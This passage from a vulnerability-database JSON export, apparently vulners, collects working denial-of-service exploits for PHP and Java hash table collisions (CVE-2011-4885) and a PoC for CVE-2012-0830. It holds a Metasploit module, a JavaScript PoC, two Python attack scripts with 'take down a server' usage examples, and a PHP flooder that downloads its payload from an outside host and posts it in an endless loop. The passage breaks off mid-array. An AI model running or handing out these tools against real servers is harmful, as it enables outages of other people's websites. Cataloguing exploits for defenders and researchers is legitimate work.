]),\n      OptInt.new('RLIMIT', [ true, \"Number of requests to send\", 50 ])\n    ])\n\n    register_advanced_options(\n    [\n      OptInt.new('RecursiveMax', [false, \"Maximum recursions when searching for collisionchars\", 15]),\n      OptInt.new('MaxPayloadSize', [false, \"Maximum size of the Payload in Megabyte. Autoadjust if 0\", 0]),\n      OptInt.new('CollisionChars', [false, \"Number of colliding chars to find\", 5]),\n      OptInt.new('CollisionCharLength', [false, \"Length of the collision chars (2 = Ey, FZ; 3=HyA, ...)\", 2]),\n      OptInt.new('PayloadLength', [false, \"Length of each parameter in the payload\", 8])\n    ])\n  end\n\n  def generate_payload\n    # Taken from:\n    # https://github.com/koto/blog-kotowicz-net-examples/tree/master/hashcollision\n\n    @recursive_counter = 1\n    collision_chars = compute_collision_chars\n    return nil if collision_chars == nil\n\n    length = datastore['PayloadLength']\n    size = collision_chars.length\n    post = \"\"\n    max_value_float = size ** length\n    max_value_int = max_value_float.floor\n    print_status(\"#{rhost}:#{rport} - Generating POST data...\")\n    for i in 0.upto(max_value_int)\n      input_string = i.to_s(size)\n      result = input_string.rjust(length, \"0\")\n      collision_chars.each do |key, value|\n        result = result.gsub(key, value)\n      end\n      post << \"#{Rex::Text.uri_encode(result)}=&\"\n    end\n    return post\n  end\n\n  def compute_collision_chars\n    print_status(\"#{rhost}:#{rport} - Trying to find hashes...\") if @recursive_counter == 1\n    hashes = {}\n    counter = 0\n    length = datastore['CollisionCharLength']\n    a = []\n    for i in @char_range\n      a << i.chr\n    end\n    # Generate all possible strings\n    source = a\n    for i in Range.new(1,length-1)\n      source = source.product(a)\n    end\n    source = source.map(&:join)\n    # and pick a random one\n    base_str = source.sample\n    base_hash = @function.call(base_str)\n    hashes[counter.to_s] = base_str\n    counter = counter + 1\n    for item in source\n      if item == base_str\n        next\n      end\n      if @function.call(item) == base_hash\n        # Hooray we found a matching hash\n        hashes[counter.to_s] = item\n        counter = counter + 1\n      end\n      if counter >= datastore['CollisionChars']\n        break\n      end\n    end\n    if counter < datastore['CollisionChars']\n      # Try it again\n      if @recursive_counter > datastore['RecursiveMax']\n        print_error(\"#{rhost}:#{rport} - Not enough values found. Please start this script again.\")\n        return nil\n      end\n      print_status(\"#{rhost}:#{rport} - #{@recursive_counter}: Not enough values found. Trying again...\")\n      @recursive_counter = @recursive_counter + 1\n      hashes = compute_collision_chars\n    else\n      print_status(\"#{rhost}:#{rport} - Found values:\")\n      hashes.each_value do |item|\n        print_status(\"#{rhost}:#{rport} -\\tValue: #{item}\\tHash: #{@function.call(item)}\")\n        item.each_char do |c|\n          print_status(\"#{rhost}:#{rport} -\\t\\tValue: #{c}\\tCharcode: #{c.unpack(\"C\")}\")\n        end\n      end\n    end\n    return hashes\n  end\n\n  # General hash function, Dan \"djb\" Bernstein times XX add\n  def djbxa(input_string, base, start)\n    counter = input_string.length - 1\n    result = start\n    input_string.each_char do |item|\n      result = result + ((base ** counter) * item.ord)\n      counter = counter - 1\n    end\n    return result.round\n  end\n\n  # PHP's hash function (djb times 33 add)\n  def djbx33a(input_string)\n    return djbxa(input_string, 33, 5381)\n  end\n\n  # Java's hash function (djb times 31 add)\n  def djbx31a(input_string)\n    return djbxa(input_string, 31, 0)\n  end\n\n  def run\n    case datastore['TARGET']\n      when /PHP/\n        @function = method(:djbx33a)\n        @char_range = Range.new(0, 255)\n        if (datastore['MaxPayloadSize'] <= 0)\n          datastore['MaxPayloadSize'] = 8   # XXX: Refactor\n        end\n      when /Java/\n        @function = method(:djbx31a)\n        @char_range = Range.new(0, 128)\n        if (datastore['MaxPayloadSize'] <= 0)\n          datastore['MaxPayloadSize'] = 2   # XXX: Refactor\n        end\n      else\n        raise RuntimeError, \"Target #{datastore['TARGET']} not supported\"\n    end\n\n    print_status(\"#{rhost}:#{rport} - Generating payload...\")\n    payload = generate_payload\n    return if payload == nil\n    # trim to maximum payload size (in MB)\n    max_in_mb = datastore['MaxPayloadSize']*1024*1024\n    payload = payload[0,max_in_mb]\n    # remove last invalid(cut off) parameter\n    position = payload.rindex(\"=&\")\n    payload = payload[0,position+1]\n    print_status(\"#{rhost}:#{rport} -Payload generated\")\n\n    for x in 1..datastore['RLIMIT']\n      print_status(\"#{rhost}:#{rport} - Sending request ##{x}...\")\n      opts = {\n        'method'\t=> 'POST',\n        'uri'\t\t=> normalize_uri(datastore['URL']),\n        'data'\t\t=> payload\n      }\n      begin\n        c = connect\n        r = c.request_cgi(opts)\n        c.send_request(r)\n        # Don't wait for a response, can take hours\n      rescue ::Rex::ConnectionError => exception\n        print_error(\"#{rhost}:#{rport} - Unable to connect: '#{exception.message}'\")\n        return\n      ensure\n        disconnect(c) if c\n      end\n    end\n  end\nend\n",
            "cvss": {
                "score": 7.8,
                "vector": "AV:N/AC:L/Au:N/C:N/I:N/A:C"
            },
            "vhref": "https://vulners.com/metasploit/MSF:AUXILIARY/DOS/HTTP/HASHCOLLISION_DOS"
        },
        {
            "bulletinFamily": "exploit",
            "description": "CVE-2012-0830\r\n\r\nPhp\u662f\u4e00\u6b3e\u6d41\u884c\u7684\u7f16\u7a0b\u8bed\u8a00\r\n\r\nPHP\u572812\u6708\u4e3a\u54c8\u5e0c\u78b0\u649e\u62d2\u7edd\u670d\u52a1(CVE-2011-4885)(http://sebug.net/vuldb/ssvid-30001)\u63d0\u4f9b\u7684\u8865\u4e01\u5f15\u51fa\u4e86\u53e6\u4e00\u4e2a\u4e25\u91cd\u7684\u5b89\u5168\u6f0f\u6d1e\u3002\r\n\r\n\u9632\u6b62\u54c8\u5e0c\u78b0\u649e\u7684\u8865\u4e01\u5728php.ini\u4e2d\u5f15\u5165\u4e86\u65b0\u7684\u914d\u7f6e\u5c5e\u6027\uff1a\r\nmax_input_vars\r\n\r\n\u6b64\u914d\u7f6e\u5143\u7d20\u9650\u5236\u7528\u4e8e\u8bf7\u6c42\u4e2d\u4f7f\u7528\u7684\u53d8\u91cf\u6570\u91cf(\u5982http://request.com/foo.php?a=1&amp;b=2&amp;c=3)\uff0c\u9ed8\u8ba4\u8bbe\u7f6e\u4e3a1000\u3002\r\n\r\n\u6f0f\u6d1e\u4fee\u8865\u5728php_variables.c\u4ee3\u7801\u4e2d\u7684php_register_variable_ex\u51fd\u6570\u4e2d\u4f5c\u4e86\u66f4\u6539\uff0c\u4e0d\u8fc7\u5f53\u53d8\u91cf\u6570\u8d85\u8fc7max_input_vars\uff0c\u800c\u53d8\u91cf\u53c8\u662f\u6570\u7ec4\u53d8\u91cf\u65f6(if (*p == \u2018['))\u53ef\u89e6\u53d1\u6b64\u6f0f\u6d1e\u3002\u6f0f\u6d1e\u53ef\u5bfc\u81f4\u4efb\u610f\u4ee3\u7801\u6267\u884c\u3002\r\n0\r\nPHP PHP 5.3.9\r\nPHP PHP 5.3.8\r\nPHP PHP 5.3.7\r\nPHP PHP 5.3.6\r\nPHP PHP 5.3.5\r\n\u5382\u5546\u89e3\u51b3\u65b9\u6848\r\n\r\n\u7528\u6237\u53ef\u53c2\u8003\u5982\u4e0b\u4f9b\u5e94\u5546\u63d0\u4f9b\u7684\u5b89\u5168\u8865\u4e01\u4fee\u590d\u6b64\u6f0f\u6d1e\uff1a\r\nhttp://svn.php.net/viewvc/php/php-src/trunk/main/php_variables.c?view=markup&amp;pathrev=323007",
            "modified": "2012-02-03T00:00:00",
            "published": "2012-02-03T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-30071",
            "id": "SSV:30071",
            "type": "seebug",
            "title": "PHP &quot;php_register_variable_ex()&quot;\u51fd\u6570\u4efb\u610f\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e(CVE-2012-0830)",
            "sourceData": "\n                                                // Simple proof of concept for PHP bug (CVE-2012-0830) described by Stefan Esser (@i0n1c)\r\n// http://thexploit.com/sec/critical-php-remote-vulnerability-introduced-in-fix-for-php-hashtable-collision-dos/\r\n\r\n// Generate 1000 normal keys and one array\r\nfunction createEvilObj () {\r\n    var evil_obj = {};\r\n    for (var i = 0; i &lt; 1001; i++) {\r\n        evil_obj[i] = 1;\r\n    }\r\n    evil_obj['kill[]'] = 'kill';\r\n    return evil_obj;\r\n}\r\n\r\n// Serialize Javascript object into POST data\r\nfunction serializeObj (obj) {\r\n    var str = [];\r\n    for(var p in obj) {\r\n        str.push(p + &quot;=&quot; + obj[p]);\r\n    }\r\n    return str.join(&quot;&amp;&quot;);\r\n}\r\n\r\n// Run attack\r\nfunction attackSite () {\r\n    var bad = serializeObj(createEvilObj());\r\n    var xhr = new XMLHttpRequest();\r\n    xhr.open(&quot;POST&quot;, location.href, true);\r\n    xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded');\r\n    xhr.setRequestHeader('Content-Length', bad.length);\r\n    xhr.send(bad);\r\n}\r\n\r\nattackSite();\n                              ",
            "cvss": {
                "score": 7.5,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:PARTIAL/I:PARTIAL/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/seebug/SSV:30071"
        },
        {
            "bulletinFamily": "exploit",
            "description": "PHP Hash Table Collision Proof Of Concept. CVE-2011-4885. Dos exploit for php platform",
            "modified": "2012-01-03T00:00:00",
            "published": "2012-01-03T00:00:00",
            "id": "EDB-ID:18305",
            "href": "https://www.exploit-db.com/exploits/18305/",
            "type": "exploitdb",
            "title": "PHP Hash Table Collision Proof Of Concept",
            "sourceData": "#! /usr/bin/env python\r\n\r\n\"\"\"\r\nThis script was written by Christian Mehlmauer <FireFart@gmail.com>\r\nhttps://twitter.com/#!/_FireFart_\r\n\r\nSourcecode online at:\r\nhttps://github.com/FireFart/HashCollision-DOS-POC\r\n\r\nOriginal PHP Payloadgenerator taken from https://github.com/koto/blog-kotowicz-net-examples/tree/master/hashcollision\r\n\r\nhttp://www.ocert.org/advisories/ocert-2011-003.html\r\nCVE:\r\nApache Geronimo: CVE-2011-5034\r\nOracle Glassfish: CVE-2011-5035\r\nPHP: CVE-2011-4885\r\nApache Tomcat: CVE-2011-4858\r\n\r\nrequires Python 2.7\r\n\r\nExamples:\r\n-) Make a single Request, wait for the response and save the response to output0.html\r\npython HashtablePOC.py -u https://host/index.php -v -c 1 -w -o output -t PHP\r\n\r\n-) Take down a PHP server(make 500 requests without waiting for a response):\r\npython HashtablePOC.py -u https://host/index.php -v -c 500 -t PHP\r\n\r\n-) Take down a JAVA server(make 500 requests without waiting for a response, maximum POST data size 2MB):\r\npython HashtablePOC.py -u https://host/index.jsp -v -c 500 -t JAVA -m 2\r\n\r\nChangelog:\r\nv6.0: Added Javapayloadgenerator\r\nv5.0: Define max payload size as parameter\r\nv4.0: Get PHP Collision Chars on the fly\r\nv3.0: Load Payload from file\r\nv2.0: Added Support for https, switched to HTTP 1.1\r\nv1.0: Initial Release\r\n\"\"\"\r\n\r\nimport socket\r\nimport sys\r\nimport math\r\nimport urllib\r\nimport string\r\nimport time\r\nimport urlparse\r\nimport argparse\r\nimport ssl\r\nimport random\r\nimport itertools\r\n\r\nclass Payloadgenerator:\r\n    # Maximum recursions when searching for collisionchars\r\n    _recursivemax = 15\r\n    _recursivecounter = 1\r\n    \r\n    def __init__(self, verbose, collisionchars = 5, collisioncharlength = 2, payloadlength = 8):\r\n        self._verbose = verbose\r\n        self._collisionchars = collisionchars\r\n        self._collisioncharlength = collisioncharlength\r\n        self._payloadlength = payloadlength\r\n    \r\n    def generateASPPayload(self):\r\n        raise Exception(\"ASP Payload not implemented\")\r\n    \r\n    def generateJAVAPayload(self):\r\n        a = self._computeJAVACollisionChars(self._collisionchars)\r\n        return self._generatePayload(a, self._payloadlength)\r\n    \r\n    def generatePHPPayload(self):\r\n        # Note: Default max POST Data Length in PHP is 8388608 bytes (8MB)\r\n        # compute entries with collisions in PHP hashtable hash function\r\n        a = self._computePHPCollisionChars(self._collisionchars)\r\n        return self._generatePayload(a, self._payloadlength);\r\n    \r\n    def _computePHPCollisionChars(self, count):\r\n        charrange = range(0, 256)\r\n        return self._computeCollisionChars(self._DJBX33A, count, charrange)\r\n    \r\n    def _computeJAVACollisionChars(self, count):\r\n        charrange = range(0, 129)\r\n        return self._computeCollisionChars(self._DJBX31A, count, charrange)\r\n    \r\n    def _computeCollisionChars(self, function, count, charrange):\r\n        hashes = {}\r\n        counter = 0\r\n        length = self._collisioncharlength\r\n        a = \"\"\r\n        for i in charrange:\r\n            a = a+chr(i)\r\n        source = list(itertools.product(a, repeat=length))\r\n        basestr = ''.join(random.choice(source))\r\n        basehash = function(basestr)\r\n        hashes[str(counter)] = basestr\r\n        counter = counter + 1\r\n        for item in source:\r\n            tempstr = ''.join(item)\r\n            if tempstr == basestr:\r\n                continue\r\n            if function(tempstr) == basehash:\r\n                hashes[str(counter)] = tempstr\r\n                counter = counter + 1\r\n            if counter >= count:\r\n                break;\r\n        if counter < count:\r\n            # Try it again\r\n            if self._recursivecounter > self._recursivemax:\r\n                print(\"Not enought values found. Please start this script again\")\r\n                sys.exit(1)\r\n            print(\"%d: Not enough values found. Trying it again...\" % self._recursivecounter)\r\n            self._recursivecounter = self._recursivecounter + 1\r\n            hashes = self._computeCollisionChars(function, count, charrange)\r\n        else:\r\n            if self._verbose:\r\n                print(\"Found values:\")\r\n                for item in hashes:\r\n                    tempstr = hashes[item]\r\n                    print(\"\\tValue: %s\\tHash: %s\" % (tempstr, function(tempstr)))\r\n                    for i in tempstr:\r\n                        print(\"\\t\\tValue: %s\\tCharcode: %d\" % (i, ord(i)))\r\n        return hashes\r\n    \r\n    def _DJBXA(self, inputstring, base, start):\r\n        counter = len(inputstring) - 1\r\n        result = start\r\n        for item in inputstring:\r\n            result = result + (math.pow(base, counter) * ord(item))\r\n            counter = counter - 1\r\n        return int(round(result))\r\n    \r\n    #PHP\r\n    def _DJBX33A(self, inputstring):\r\n        return self._DJBXA(inputstring, 33, 5381)\r\n    \r\n    #Java\r\n    def _DJBX31A(self, inputstring):\r\n        return self._DJBXA(inputstring, 31, 0)\r\n    \r\n    #ASP\r\n    def _DJBX33X(self, inputstring):\r\n        counter = len(inputstring) - 1\r\n        result = 5381\r\n        for item in inputstring:\r\n            result = result + (int(round(math.pow(33, counter))) ^ ord(item))\r\n            counter = counter - 1\r\n        return int(round(result))\r\n    \r\n    def _generatePayload(self, collisionchars, payloadlength):\r\n        # Taken from:\r\n        # https://github.com/koto/blog-kotowicz-net-examples/tree/master/hashcollision\r\n    \r\n        # how long should the payload be\r\n        length = payloadlength\r\n        size = len(collisionchars)\r\n        post = \"\"\r\n        maxvaluefloat = math.pow(size,length)\r\n        maxvalueint = int(math.floor(maxvaluefloat))\r\n        for i in range (maxvalueint):\r\n            inputstring = self._base_convert(i, size)\r\n            result = inputstring.rjust(length, \"0\")\r\n            for item in collisionchars:\r\n                result = result.replace(str(item), collisionchars[item])\r\n            post += urllib.urlencode({result:\"\"}) + \"&\"\r\n    \r\n        return post;\r\n    \r\n    def _base_convert(self, num, base):\r\n        fullalphabet = \"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\"\r\n        alphabet = fullalphabet[:base]\r\n        if (num == 0):\r\n            return alphabet[0]\r\n        arr = []\r\n        base = len(alphabet)\r\n        while num:\r\n            rem = num % base\r\n            num = num // base\r\n            arr.append(alphabet[rem])\r\n        arr.reverse()\r\n        return \"\".join(arr)\r\n\r\ndef main():\r\n    parser = argparse.ArgumentParser(description=\"Take down a remote Host via Hashcollisions\", prog=\"Universal Hashcollision Exploit\")\r\n    parser.add_argument(\"-u\", \"--url\", dest=\"url\", help=\"Url to attack\", required=True)\r\n    parser.add_argument(\"-w\", \"--wait\", dest=\"wait\", action=\"store_true\", default=False, help=\"wait for Response\")\r\n    parser.add_argument(\"-c\", \"--count\", dest=\"count\", type=int, default=1, help=\"How many requests\")\r\n    parser.add_argument(\"-v\", \"--verbose\", dest=\"verbose\", action=\"store_true\", default=False, help=\"Verbose output\")\r\n    parser.add_argument(\"-s\", \"--save\", dest=\"save\", help=\"Save payload to file\")\r\n    parser.add_argument(\"-p\", \"--payload\", dest=\"payload\", help=\"Save payload to file\")\r\n    parser.add_argument(\"-o\", \"--output\", dest=\"output\", help=\"Save Server response to file. This name is only a pattern. HTML Extension will be appended. Implies -w\")\r\n    parser.add_argument(\"-t\", \"--target\", dest=\"target\", help=\"Target of the attack\", choices=[\"ASP\", \"PHP\", \"JAVA\"], required=True)\r\n    parser.add_argument(\"-m\", \"--max-payload-size\", dest=\"maxpayloadsize\", help=\"Maximum size of the Payload in Megabyte. PHPs defaultconfiguration does not allow more than 8MB, Tomcat is 2MB\", type=int)\r\n    parser.add_argument(\"-g\", \"--generate\", dest=\"generate\", help=\"Only generate Payload and exit\", default=False, action=\"store_true\")\r\n    parser.add_argument(\"--version\", action=\"version\", version=\"%(prog)s 6.0\")\r\n\r\n    options = parser.parse_args()\r\n    \r\n    if options.target == \"PHP\":\r\n        if not options.maxpayloadsize or options.maxpayloadsize == 0:\r\n            maxpayloadsize = 8\r\n        else:\r\n            maxpayloadsize = options.maxpayloadsize\r\n    elif options.target == \"ASP\":\r\n        if not options.maxpayloadsize or options.maxpayloadsize == 0:\r\n            maxpayloadsize = 8\r\n        else:\r\n            maxpayloadsize = options.maxpayloadsize\r\n    elif options.target == \"JAVA\":\r\n        if not options.maxpayloadsize or options.maxpayloadsize == 0:\r\n            maxpayloadsize = 2\r\n        else:\r\n            maxpayloadsize = options.maxpayloadsize\r\n    else:\r\n        print(\"Target %s not yet implemented\" % options.target)\r\n        sys.exit(1)\r\n\r\n    url = urlparse.urlparse(options.url)\r\n\r\n    if not url.scheme:\r\n        print(\"Please provide a scheme to the URL(http://, https://,..\")\r\n        sys.exit(1)\r\n\r\n    host = url.hostname\r\n    path = url.path\r\n    port = url.port\r\n    if not port:\r\n        if url.scheme == \"https\":\r\n            port = 443\r\n        elif url.scheme == \"http\":\r\n            port = 80\r\n        else:\r\n            print(\"Unsupported Protocol %s\" % url.scheme)\r\n            sys.exit(1)\r\n    if not path:\r\n        path = \"/\"\r\n\r\n    if not options.payload:\r\n        print(\"Generating Payload...\")\r\n        \r\n        # Number of colliding chars to find\r\n        collisionchars = 5\r\n        # Length of the collision chars (2 = Ey, FZ; 3=HyA, ...)\r\n        collisioncharlength = 2\r\n        # Length of each parameter in the payload\r\n        payloadlength = 8\r\n        generator = Payloadgenerator(options.verbose, collisionchars, collisioncharlength, payloadlength)\r\n        if options.target == \"PHP\":\r\n            payload = generator.generatePHPPayload()\r\n        elif options.target == \"ASP\":\r\n            #payload = generateASPPayload()\r\n            print(\"Target %s not yet implemented\" % options.target)\r\n            sys.exit(1)\r\n        elif options.target == \"JAVA\":\r\n            payload = generator.generateJAVAPayload()\r\n        else:\r\n            print(\"Target %s not yet implemented\" % options.target)\r\n            sys.exit(1)\r\n\r\n        print(\"Payload generated\")\r\n    else:\r\n        f = open(options.payload, \"r\")\r\n        payload = f.read()\r\n        f.close()\r\n        print(\"Loaded Payload from %s\" % options.payload)\r\n\r\n    # trim to maximum payload size (in MB)\r\n    maxinmb = maxpayloadsize*1024*1024\r\n    payload = payload[:maxinmb]\r\n    # remove last invalid(cut off) parameter\r\n    position = payload.rfind(\"=&\")\r\n    payload = payload[:position+1]\r\n    \r\n    # Save payload\r\n    if options.save:\r\n        f = open(options.save, \"w\")\r\n        f.write(payload)\r\n        f.close()\r\n        print(\"Payload saved to %s\" % options.save)\r\n\r\n    # User selected to only generate the payload\r\n    if options.generate:\r\n        return\r\n\r\n    print(\"Host: %s\" % host)\r\n    print(\"Port: %s\" % str(port))\r\n    print(\"path: %s\" % path)\r\n    print\r\n    print\r\n\r\n    for i in range(options.count):\r\n        print(\"sending Request #%s...\" % str(i+1))\r\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\n        if url.scheme == \"https\":\r\n            ssl_sock = ssl.wrap_socket(sock)\r\n            ssl_sock.connect((host, port))\r\n            ssl_sock.settimeout(None)\r\n        else:\r\n            sock.connect((host, port))\r\n            sock.settimeout(None)\r\n\r\n        request = \"POST %s HTTP/1.1\\r\\n\\\r\nHost: %s\\r\\n\\\r\nContent-Type: application/x-www-form-urlencoded; charset=utf-8\\r\\n\\\r\nConnection: Close\\r\\n\\\r\nUser-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; de; rv:1.9.2.20) Gecko/20110803 Firefox/3.6.20 ( .NET CLR 3.5.30729; .NET4.0E)\\r\\n\\\r\nContent-Length: %s\\r\\n\\\r\n\\r\\n\\\r\n%s\\r\\n\\\r\n\\r\\n\" % (path, host, str(len(payload)), payload)\r\n\r\n        if url.scheme == \"https\":\r\n            ssl_sock.send(request)\r\n        else:\r\n            sock.send(request)\r\n\r\n        if options.verbose:\r\n            if len(request) > 400:\r\n                print(request[:400]+\"....\")\r\n            else:\r\n                print(request)\r\n            print(\"\")\r\n        if options.wait or options.output:\r\n            start = time.time()\r\n            if url.scheme == \"https\":\r\n                data = ssl_sock.recv(1024)\r\n                string = \"\"\r\n                while len(data):\r\n                    string = string + data\r\n                    data = ssl_sock.recv(1024)\r\n            else:\r\n                data = sock.recv(1024)\r\n                string = \"\"\r\n                while len(data):\r\n                    string = string + data\r\n                    data = sock.recv(1024)\r\n            \r\n            elapsed = (time.time() - start)\r\n            print(\"Request %s finished\" % str(i+1))\r\n            print(\"Request %s duration: %s\" % (str(i+1), elapsed))\r\n            split = string.partition(\"\\r\\n\\r\\n\")\r\n            header = split[0]\r\n            content = split[2]\r\n            if options.verbose:\r\n                # only print http header\r\n                print(\"\")\r\n                print(header)\r\n                print(\"\")\r\n            if options.output:\r\n                f = open(options.output+str(i)+\".html\", \"w\")\r\n                f.write(\"<!-- \"+header+\" -->\\r\\n\"+content)\r\n                f.close()\r\n\r\n        if url.scheme == \"https\":\r\n            ssl_sock.close()\r\n            sock.close()\r\n        else:\r\n            sock.close()\r\n\r\nif __name__ == \"__main__\":\r\n    main()",
            "cvss": {
                "score": 5.0,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:NONE/I:NONE/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/exploitdb/EDB-ID:18305"
        },
        {
            "bulletinFamily": "exploit",
            "description": "",
            "modified": "2012-01-02T00:00:00",
            "published": "2012-01-02T00:00:00",
            "href": "https://packetstormsecurity.com/files/108294/PHP-5.3.x-Hash-Collision-Proof-Of-Concept-Code.html",
            "id": "PACKETSTORM:108294",
            "type": "packetstorm",
            "title": "PHP 5.3.x Hash Collision Proof Of Concept Code",
            "sourceData": "`'''  \nThis script was written by Christian Mehlmauer <FireFart@gmail.com>  \nOriginal PHP Payloadgenerator taken from https://github.com/koto/blog-kotowicz-net-examples/tree/master/hashcollision  \nCVE : CVE-2011-4885  \n  \nrequires Python 2.7  \n  \nExamples:  \n-) Make a single Request, wait for the response and save the response to output0.html  \npython HashtablePOC.py -u https://host/index.php -v -c 1 -w -o output  \n  \n-) Take down a server(make 500 requests without waiting for a response):  \npython HashtablePOC.py -u https://host/index.php -v -c 500  \n  \nChangelog:  \nv2.0: Added Support for https, switched to HTTP 1.1  \nv1.0: Initial Release  \n'''  \n  \nimport socket  \nimport sys  \nimport math  \nimport urllib  \nimport string  \nimport time  \nimport urlparse  \nimport argparse  \nimport ssl  \n  \ndef main():  \nparser = argparse.ArgumentParser(description=\"Take down a remote PHP Host\", prog=\"PHP Hashtable Exploit\")  \nparser.add_argument(\"-u\", \"--url\", dest=\"url\", help=\"Url to attack\", required=True)  \nparser.add_argument(\"-w\", \"--wait\", dest=\"wait\", action=\"store_true\", default=False, help=\"wait for Response\")  \nparser.add_argument(\"-c\", \"--count\", dest=\"count\", type=int, default=1, help=\"How many requests\")  \nparser.add_argument(\"-v\", \"--verbose\", dest=\"verbose\", action=\"store_true\", default=False, help=\"Verbose output\")  \nparser.add_argument(\"-f\", \"--file\", dest=\"file\", help=\"Save payload to file\")  \nparser.add_argument(\"-o\", \"--output\", dest=\"output\", help=\"Save Server response to file. This name is only a pattern. HTML Extension will be appended. Implies -w\")  \nparser.add_argument('--version', action='version', version='%(prog)s 2.0')  \n  \noptions = parser.parse_args()  \n  \nurl = urlparse.urlparse(options.url)  \n  \nif not url.scheme:  \nprint(\"Please provide a scheme to the URL(http://, https://,..\")  \nsys.exit(1)  \n  \nhost = url.hostname  \npath = url.path  \nport = url.port  \nif not port:  \nif url.scheme == \"https\":  \nport = 443  \nelif url.scheme == \"http\":  \nport = 80  \nelse:  \nprint(\"Unsupported Protocol %s\" % url.scheme)  \nsys.exit(1)  \nif not path:  \npath = \"/\"  \n  \nprint(\"Generating Payload...\")  \npayload = generatePayload()  \nprint(\"Payload generated\")  \nif options.file:  \nf = open(options.file, 'w')  \nf.write(payload)  \nf.close()  \nprint(\"Payload saved to %s\" % options.file)  \nprint(\"Host: %s\" % host)  \nprint(\"Port: %s\" % str(port))  \nprint(\"path: %s\" % path)  \nprint  \nprint  \n  \nfor i in range(options.count):  \nprint(\"sending Request #%s...\" % str(i+1))  \nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  \nif url.scheme == \"https\":  \nssl_sock = ssl.wrap_socket(sock)  \nssl_sock.connect((host, port))  \nssl_sock.settimeout(None)  \nelse:  \nsock.connect((host, port))  \nsock.settimeout(None)  \n  \nrequest = \"\"\"POST %s HTTP/1.1  \nHost: %s  \nContent-Type: application/x-www-form-urlencoded  \nUser-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; de; rv:1.9.2.20) Gecko/20110803 Firefox/3.6.20 ( .NET CLR 3.5.30729; .NET4.0E)  \nContent-Length: %s  \n  \n%s  \n  \n\"\"\" % (path, host, str(len(payload)), payload)  \n  \nif url.scheme == \"https\":  \nssl_sock.send(request)  \nelse:  \nsock.send(request)  \n  \nif options.verbose:  \nif len(request) > 300:  \nprint(request[:300]+\"....\")  \nelse:  \nprint(request)  \nprint  \nif options.wait or options.output:  \nstart = time.clock()  \nif url.scheme == \"https\":  \ndata = ssl_sock.recv(1024)  \nstring = \"\"  \nwhile len(data):  \nstring = string + data  \ndata = ssl_sock.recv(1024)  \nelse:  \ndata = sock.recv(1024)  \nstring = \"\"  \nwhile len(data):  \nstring = string + data  \ndata = sock.recv(1024)  \n  \nelapsed = (time.clock() - start)  \nprint (\"Request %s finished\" % str(i+1))  \nprint (\"Request %s duration: %s\" % (str(i+1), elapsed))  \nsplit = string.partition(\"\\r\\n\\r\\n\")  \nheader = split[0]  \ncontent = split[2]  \nif options.verbose:  \n# only print http header  \nprint  \nprint(header)  \nprint  \nif options.output:  \nf = open(options.output+str(i)+\".html\", 'w')  \nf.write(\"<!-- \"+header+\" -->\\r\\n\"+content)  \nf.close()  \n  \nif url.scheme == \"https\":  \nssl_sock.close()  \nsock.close()  \nelse:  \nsock.close()  \n  \ndef generatePayload():  \n# Taken from:  \n# https://github.com/koto/blog-kotowicz-net-examples/tree/master/hashcollision  \n  \n# Note: Default max POST Data Length in PHP is 8388608 bytes (8MB)  \n  \n# entries with collisions in PHP hashtable hash function   \na = {'0':'Ez', '1':'FY', '2':'G8', '3':'H'+chr(23), '4':'D'+chr(122+33)}  \n# how long should the payload be  \nlength = 7  \nsize = len(a)  \npost = \"\"  \nmaxvaluefloat = math.pow(size,length)  \nmaxvalueint = int(math.floor(maxvaluefloat))  \nfor i in range (maxvalueint):  \ninputstring = base_convert(i, size)  \nresult = inputstring.rjust(length, '0')  \nfor item in a:  \nresult = result.replace(item, a[item])  \npost += '' + urllib.quote(result) + '=&'  \n  \nreturn post;  \n  \ndef base_convert(num, base):  \nfullalphabet = \"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\"  \nalphabet = fullalphabet[:base]  \nif (num == 0):  \nreturn alphabet[0]  \narr = []  \nbase = len(alphabet)  \nwhile num:  \nrem = num % base  \nnum = num // base  \narr.append(alphabet[rem])  \narr.reverse()  \nreturn ''.join(arr)  \n  \nif __name__ == \"__main__\":  \nmain()  \n`\n",
            "cvss": {
                "score": 5.0,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:NONE/I:NONE/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/packetstorm/PACKETSTORM:108294"
        },
        {
            "bulletinFamily": "exploit",
            "description": "",
            "modified": "2012-01-01T00:00:00",
            "published": "2012-01-01T00:00:00",
            "href": "https://packetstormsecurity.com/files/108287/PHP-5.3.x-Hashtables-Proof-Of-Concept.html",
            "id": "PACKETSTORM:108287",
            "type": "packetstorm",
            "title": "PHP 5.3.x Hashtables Proof Of Concept",
            "sourceData": "`<?php  \n/*  \nPHP 5.3.* Hash Colission DoS Exploit by infodox  \nOriginal version by itz me (opensc.ws)  \nCVE-2011-4885  \n  \nMirrors List:  \nhttp://compsoc.nuigalway.ie/~infodox/hashcollide.txt  \nhttp://jrs-s.net/hashcollide.txt  \nhttp://www.infodox.co.cc/Downloads/hashcollide.txt  \n  \nChanges:  \nDifferent mirror for hashcollide.txt  \nNow takes target as a command line argument  \nStatus message printing  \n  \nTwitter: @info_dox  \nBlog: blog.infodox.co.cc  \nSite: http://www.infodox.co.cc/  \n*/  \n$targ = $argv[1];  \n$x = file_get_contents(\"http://jrs-s.net/hashcollide.txt\"); // if this doesnt work replace with the mirrors_lst ones...  \nwhile(1) {  \necho \"firing\";  \n$ch = curl_init(\"$targ\");  \ncurl_setopt($ch, CURLOPT_POSTFIELDS, $x);  \ncurl_exec($ch);  \ncurl_close($ch);  \necho \"[+] Voly Sent!\";  \n}  \n?>  \n`\n",
            "cvss": {
                "score": 5.0,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:NONE/I:NONE/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/packetstorm/PACKETSTORM:108287"
        },
        {
